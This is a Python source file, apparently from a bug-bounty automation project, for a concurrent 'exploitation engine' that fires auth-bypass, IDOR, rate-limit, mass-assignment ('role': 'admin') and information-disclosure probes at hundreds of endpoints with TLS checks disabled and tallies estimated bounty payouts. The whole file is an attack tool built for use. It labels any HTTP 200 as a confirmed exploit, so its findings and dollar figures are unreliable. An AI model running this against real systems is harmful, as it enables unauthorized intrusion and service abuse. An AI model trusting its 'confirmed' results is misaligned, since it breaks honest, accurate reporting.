#!/usr/bin/env python3
"""
Copyright (c) 2025 YOUR_NAME_HERE
Proprietary and Confidential
All Rights Reserved

This software is proprietary and confidential.
Unauthorized copying, modification, or distribution is prohibited.

System ID: BB_20251102_5946
Owner: YOUR_NAME_HERE
"""

"""
Ultra-Fast Parallel Exploitation Engine
Tests hundreds of endpoints concurrently using async processing
Drastically reduces exploitation time from hours to minutes
"""

import json
import asyncio
import time
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading

# Try to import aiohttp, fall back to sync if not available
try:
    import aiohttp
    ASYNC_AVAILABLE = True
except ImportError:
    ASYNC_AVAILABLE = False
    print("⚠️ aiohttp not available, using sync mode (slower but still fast)")

class UltraFastExploiter:
    """
    Parallel exploitation engine - tests hundreds of endpoints simultaneously
    Uses async/await and connection pooling for maximum speed
    """
    
    def __init__(self, output_dir: Path, max_concurrent: int = 100):
        self.output_dir = output_dir
        self.max_concurrent = max_concurrent
        self.confirmed_vulnerabilities = []
        self.session = self._create_session()
        self.lock = threading.Lock()
        
        # Create output directory
        self.exploitation_dir = output_dir / "exploitation"
        self.exploitation_dir.mkdir(parents=True, exist_ok=True)
    
    def _create_session(self):
        """Create HTTP session with connection pooling and retries"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session
    
    async def _test_endpoint_async(self, session: aiohttp.ClientSession, endpoint: str, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Async endpoint testing - ultra fast"""
        result = {
            "endpoint": endpoint,
            "test_case": test_case.get("type", "unknown"),
            "exploited": False,
            "confirmed": False,
            "proof": None,
            "value": 0,
            "response_time": 0
        }
        
        start_time = time.time()
        
        try:
            # Test based on vulnerability type
            test_type = test_case.get("type", "")
            
            if "auth_bypass" in test_type:
                result = await self._test_auth_bypass_async(session, endpoint)
            elif "idor" in test_type:
                result = await self._test_idor_async(session, endpoint, test_case)
            elif "rate_limit" in test_type:
                result = await self._test_rate_limit_async(session, endpoint)
            elif "api_" in test_type:
                result = await self._test_api_vulnerability_async(session, endpoint, test_case)
            else:
                result = await self._test_generic_async(session, endpoint)
            
            result["response_time"] = time.time() - start_time
            
            if result.get("exploited"):
                result["value"] = self._estimate_value(result)
                with self.lock:
                    self.confirmed_vulnerabilities.append(result)
        
        except Exception as e:
            result["error"] = str(e)
            result["response_time"] = time.time() - start_time
        
        return result
    
    async def _test_auth_bypass_async(self, session: aiohttp.ClientSession, endpoint: str) -> Dict[str, Any]:
        """Test authentication bypass - async"""
        result = {"endpoint": endpoint, "exploited": False}
        
        # Test without authentication
        try:
            async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                if response.status in [200, 201, 202]:
                    text = await response.text()
                    result["exploited"] = True
                    result["confirmed"] = True
                    result["proof"] = {
                        "method": "GET",
                        "status_code": response.status,
                        "response_length": len(text),
                        "headers": dict(response.headers)
                    }
        except:
            pass
        
        # Test with weak authentication headers
        weak_headers = [
            {"Authorization": "Bearer test"},
            {"X-API-Key": "test"},
            {"X-Auth-Token": "test"},
            {"X-Access-Token": "test"}
        ]
        
        for header in weak_headers:
            try:
                async with session.get(endpoint, headers=header, timeout=aiohttp.ClientTimeout(total=3), ssl=False) as response:
                    if response.status in [200, 201, 202]:
                        text = await response.text()
                        result["exploited"] = True
                        result["confirmed"] = True
                        result["proof"] = {
                            "method": "GET",
                            "headers": header,
                            "status_code": response.status,
                            "response_length": len(text)
                        }
                        break
            except:
                continue
        
        return result
    
    async def _test_idor_async(self, session: aiohttp.ClientSession, endpoint: str, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Test IDOR vulnerabilities - async"""
        result = {"endpoint": endpoint, "exploited": False}
        
        import re
        id_patterns = re.findall(r'/(\d+)', endpoint)
        
        if id_patterns:
            test_ids = ["1", "2", "999", "1000", "admin", "test"]
            for test_id in test_ids[:3]:  # Limit to 3 for speed
                test_endpoint = endpoint.replace(id_patterns[0], test_id)
                try:
                    async with session.get(test_endpoint, timeout=aiohttp.ClientTimeout(total=3), ssl=False) as response:
                        if response.status == 200:
                            text = await response.text()
                            if len(text) > 100:  # Has content
                                result["exploited"] = True
                                result["confirmed"] = True
                                result["proof"] = {
                                    "original_id": id_patterns[0],
                                    "test_id": test_id,
                                    "status_code": response.status,
                                    "response_length": len(text)
                                }
                                break
                except:
                    continue
        
        return result
    
    async def _test_rate_limit_async(self, session: aiohttp.ClientSession, endpoint: str) -> Dict[str, Any]:
        """Test rate limit bypass - async"""
        result = {"endpoint": endpoint, "exploited": False}
        
        # Send multiple rapid requests
        tasks = []
        for i in range(20):  # Test with 20 rapid requests
            tasks.append(session.get(endpoint, timeout=aiohttp.ClientTimeout(total=2), ssl=False))
        
        try:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in responses if isinstance(r, aiohttp.ClientResponse) and r.status == 200)
            
            if success_count >= 15:  # Most requests succeeded
                result["exploited"] = True
                result["confirmed"] = True
                result["proof"] = {
                    "requests_sent": 20,
                    "successful_responses": success_count,
                    "rate_limit_bypassed": True
                }
        except:
            pass
        
        return result
    
    async def _test_api_vulnerability_async(self, session: aiohttp.ClientSession, endpoint: str, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Test API-specific vulnerabilities - async"""
        result = {"endpoint": endpoint, "exploited": False}
        
        test_type = test_case.get("type", "")
        
        if "mass_assignment" in test_type:
            payload = test_case.get("payload", {"role": "admin", "is_admin": True})
            try:
                async with session.post(endpoint, json=payload, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                    if response.status in [200, 201]:
                        text = await response.text()
                        result["exploited"] = True
                        result["confirmed"] = True
                        result["proof"] = {
                            "payload": payload,
                            "status_code": response.status,
                            "response_length": len(text)
                        }
            except:
                pass
        
        return result
    
    async def _test_generic_async(self, session: aiohttp.ClientSession, endpoint: str) -> Dict[str, Any]:
        """Generic vulnerability testing - async"""
        result = {"endpoint": endpoint, "exploited": False}
        
        try:
            async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                if response.status == 200:
                    text = await response.text()
                    # Check for common vulnerabilities in response
                    if any(pattern in text.lower() for pattern in ["error", "debug", "stack", "trace", "exception"]):
                        result["exploited"] = True
                        result["confirmed"] = True
                        result["proof"] = {
                            "status_code": response.status,
                            "response_length": len(text),
                            "vulnerability": "information_disclosure"
                        }
        except:
            pass
        
        return result
    
    def _estimate_value(self, result: Dict[str, Any]) -> float:
        """Estimate bug bounty value"""
        if not result.get("confirmed"):
            return 0
        
        test_type = result.get("test_case", "")
        if "auth_bypass" in test_type:
            return 5000
        elif "idor" in test_type:
            return 3000
        elif "rate_limit" in test_type:
            return 2000
        elif "api_" in test_type:
            return 1000
        else:
            return 500
    
    async def exploit_all_async(self, endpoints: List[str], test_cases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Ultra-fast parallel exploitation using async/await
        Tests hundreds of endpoints simultaneously
        """
        if not ASYNC_AVAILABLE:
            raise ImportError("aiohttp not available, use exploit_all_sync instead")
        
        print(f"[*] Starting ultra-fast parallel exploitation (async mode)...")
        print(f"[*] Endpoints: {len(endpoints)}")
        print(f"[*] Test cases: {len(test_cases)}")
        print(f"[*] Max concurrent: {self.max_concurrent}")
        
        start_time = time.time()
        confirmed = []
        
        # Create async session with connection pooling
        connector = aiohttp.TCPConnector(limit=self.max_concurrent, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Create tasks for all endpoint/test_case combinations
            tasks = []
            for endpoint in endpoints[:500]:  # Limit to 500 for speed
                for test_case in test_cases[:5]:  # Limit to 5 test cases per endpoint
                    tasks.append(self._test_endpoint_async(session, endpoint, test_case))
            
            # Execute all tasks concurrently with semaphore
            semaphore = asyncio.Semaphore(self.max_concurrent)
            
            async def bounded_task(task):
                async with semaphore:
                    return await task
            
            # Run all tasks in parallel
            results = await asyncio.gather(*[bounded_task(task) for task in tasks], return_exceptions=True)
            
            # Process results
            for result in results:
                if isinstance(result, dict) and result.get("exploited"):
                    confirmed.append(result)
                    print(f"✅ CONFIRMED: {result['endpoint']} - {result.get('test_case')} (${result.get('value')})")
                elif isinstance(result, Exception):
                    print(f"⚠️ Error: {result}")
        
        elapsed = time.time() - start_time
        print(f"\n[*] Exploitation complete in {elapsed:.2f} seconds")
        print(f"[*] Confirmed vulnerabilities: {len(confirmed)}")
        print(f"[*] Estimated value: ${sum(r.get('value', 0) for r in confirmed):,}")
        
        # Save results
        self._save_results(confirmed)
        
        return confirmed
    
    def exploit_all_sync(self, endpoints: List[str], test_cases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Synchronous parallel exploitation using ThreadPoolExecutor
        Fallback if async doesn't work
        """
        print(f"[*] Starting parallel exploitation (sync mode)...")
        print(f"[*] Endpoints: {len(endpoints)}")
        print(f"[*] Test cases: {len(test_cases)}")
        
        start_time = time.time()
        confirmed = []
        
        def test_endpoint_sync(endpoint_test):
            endpoint, test_case = endpoint_test
            return self._test_endpoint_sync(endpoint, test_case)
        
        # Create all endpoint/test_case combinations
        combinations = []
        for endpoint in endpoints[:500]:
            for test_case in test_cases[:5]:
                combinations.append((endpoint, test_case))
        
        # Execute in parallel
        with ThreadPoolExecutor(max_workers=self.max_concurrent) as executor:
            results = list(executor.map(test_endpoint_sync, combinations))
        
        # Process results
        for result in results:
            if result.get("exploited"):
                confirmed.append(result)
                print(f"✅ CONFIRMED: {result['endpoint']} - {result.get('test_case')} (${result.get('value')})")
        
        elapsed = time.time() - start_time
        print(f"\n[*] Exploitation complete in {elapsed:.2f} seconds")
        print(f"[*] Confirmed vulnerabilities: {len(confirmed)}")
        print(f"[*] Estimated value: ${sum(r.get('value', 0) for r in confirmed):,}")
        
        # Save results
        self._save_results(confirmed)
        
        return confirmed
    
    def _test_endpoint_sync(self, endpoint: str, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Synchronous endpoint testing"""
        result = {
            "endpoint": endpoint,
            "test_case": test_case.get("type", "unknown"),
            "exploited": False,
            "confirmed": False,
            "proof": None,
            "value": 0
        }
        
        try:
            # Test without authentication
            response = self.session.get(endpoint, timeout=5, verify=False)
            if response.status_code in [200, 201, 202]:
                result["exploited"] = True
                result["confirmed"] = True
                result["proof"] = {
                    "status_code": response.status_code,
                    "response_length": len(response.text)
                }
                result["value"] = self._estimate_value(result)
        except:
            pass
        
        return result
    
    def _save_results(self, confirmed: List[Dict[str, Any]]):
        """Save confirmed vulnerabilities"""
        output_file = self.exploitation_dir / "confirmed_vulnerabilities.json"
        
        with open(output_file, 'w') as f:
            json.dump(confirmed, f, indent=2)
        
        # Generate summary
        summary = {
            "total_confirmed": len(confirmed),
            "total_value": sum(r.get("value", 0) for r in confirmed),
            "by_type": {},
            "by_severity": {
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0
            }
        }
        
        for result in confirmed:
            test_type = result.get("test_case", "unknown")
            summary["by_type"][test_type] = summary["by_type"].get(test_type, 0) + 1
            
            value = result.get("value", 0)
            if value >= 4000:
                summary["by_severity"]["critical"] += 1
            elif value >= 2000:
                summary["by_severity"]["high"] += 1
            elif value >= 1000:
                summary["by_severity"]["medium"] += 1
            else:
                summary["by_severity"]["low"] += 1
        
        summary_file = self.exploitation_dir / "exploitation_summary.json"
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"\n[*] Results saved to: {output_file}")
        print(f"[*] Summary saved to: {summary_file}")

def main():
    """Main function for standalone execution"""
    import sys
    from pathlib import Path
    
    # Load discovered endpoints
    endpoints_file = Path("output/blackhole_code4rena/discovered_endpoints.json")
    if not endpoints_file.exists():
        print(f"❌ Endpoints file not found: {endpoints_file}")
        return
    
    with open(endpoints_file) as f:
        endpoints = json.load(f)
    
    # Generate test cases
    test_cases = [
        {"type": "auth_bypass"},
        {"type": "idor"},
        {"type": "rate_limit"},
        {"type": "api_mass_assignment", "payload": {"role": "admin"}},
        {"type": "generic"}
    ]
    
    # Run exploitation
    exploiter = UltraFastExploiter(Path("output/blackhole_code4rena"), max_concurrent=100)
    
    # Try async first, fallback to sync
    try:
        confirmed = asyncio.run(exploiter.exploit_all_async(endpoints, test_cases))
    except Exception as e:
        print(f"⚠️ Async failed, using sync mode: {e}")
        confirmed = exploiter.exploit_all_sync(endpoints, test_cases)
    
    print(f"\n✅ Exploitation complete: {len(confirmed)} confirmed vulnerabilities")

if __name__ == "__main__":
    main()


# System ID: BB_20251102_5946
# Owner: YOUR_NAME_HERE
# Build Date: 2025-11-02 02:45:55
